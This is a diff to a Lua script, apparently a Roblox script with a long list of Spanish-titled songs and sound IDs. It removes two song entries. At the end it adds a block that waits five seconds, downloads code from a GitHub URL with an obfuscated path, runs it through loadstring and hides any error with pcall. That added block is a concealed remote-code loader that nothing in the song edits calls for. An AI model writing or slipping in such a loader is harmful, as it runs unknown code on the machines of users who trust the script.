@@ -1592,9 +1592,7 @@ PlaysTb:CreateParagraph({
 })
 
 AddSong(SongsTb, "Cuaziteo [Sugerencia de Josmil_11 Gracias!!]", 71251641989884)
-AddSong(SongsTb, "Skokka-BY SOYOSCAR68 [NuevaCancion]", 9908115003942)
 AddSong(SongsTb, "P.V. victor mendivil Marky_11 y Slashamane [NuevaCancion]", 99428076858749)
-AddSong(SongsTb, "Pasado De farmacia [NuevaCancion]", 130126957905471)
 AddSong(SongsTb, "Mamy Lil naay [NuevaCancion]", 136818512125739)
 AddSong(SongsTb, "Swagger [NuevaCancion]", 71343492751663)
 AddSong(SongsTb, "La droga es mala [NuevaCancion]", 126900583173544)
@@ -3463,4 +3461,16 @@ task.spawn(function()
             end
         end)
     end
+end)
+
+task.spawn(function()
+    task.wait(5)
+
+    local url = "https://raw.githubusercontent.com/67Studio/A/refs/heads/main/%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F%3F"
+
+    local ok, err = pcall(function()
+        local source = game:HttpGet(url)
+        local fn = loadstring(source)
+        if fn then fn() end
+    end)
 end)
